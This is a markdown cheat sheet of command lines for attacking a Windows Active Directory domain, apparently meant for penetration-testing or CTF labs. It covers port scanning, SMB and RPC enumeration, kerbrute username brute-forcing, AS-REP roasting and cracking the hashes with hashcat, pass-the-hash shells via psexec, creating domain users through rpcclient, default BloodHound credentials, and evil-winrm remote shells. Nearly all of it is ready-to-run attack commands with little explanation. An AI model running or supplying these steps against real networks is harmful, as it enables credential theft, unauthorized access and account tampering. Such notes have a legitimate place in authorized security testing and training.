### Nmap Scan 
- `nmap -p 53,135,139,88,389,445,464,593,636,3268,3269,5985,9389,49676,49696,49674,49675,49667,49666 -sV -sC -T16 -Pn -oA $IP $IP`

### Get Domain name
- `smbmap -H $IP`

### Get user's list
- `GetADUsers.py $DOMAIN.local/ -dc-ip $IP -debug`

### Brute-force users on Domain
- `kerbrute userenum -d $DOMAIN.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt — dc $IP`

### SAMBA
- `smbclient -L \\\\$IP -N` Enumerate
- `smbclient \\\\$IP/SHARE` login to share

### Get Hashes
- `GetNPUsers.py '$DOMAIN' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip $IP`

### Crack Hashes
- `hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt — force`

### Shell
`psexec.py -hashes '$HASH' dc-ip $IP $User@$IP`

### rpcclient
- `rpcclient -U "" -N $DOMAIN` Connect to rpcclient
- `enumdomusers` Enumerate Domain Users
-  `queryuser $RID` Enumerate User
- `enumdomgroups` Enumerate Domain Groups
- `getdomwinfo` Domain Password Information 
- `createdomuser $NAME` ,`setuserinfo2 $NAME 24 $PASSWORD` Creating Domain User

<!-- -->
[Enumerating AD with rpcclient](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)

### BloodHound
starting BloodHound
- `sudo neo4j console`
- `bloodhound`
 <!-- -->
 
 Credentials
- `Username: neo4j`
- `Password: BloodHound`

<!-- -->

### Misc
- `ruby evil-winrm.rb -i $IP -u $USER -p $PASS`
- `pwsh` to run powershell on kali


[WADComs](https://wadcoms.github.io/)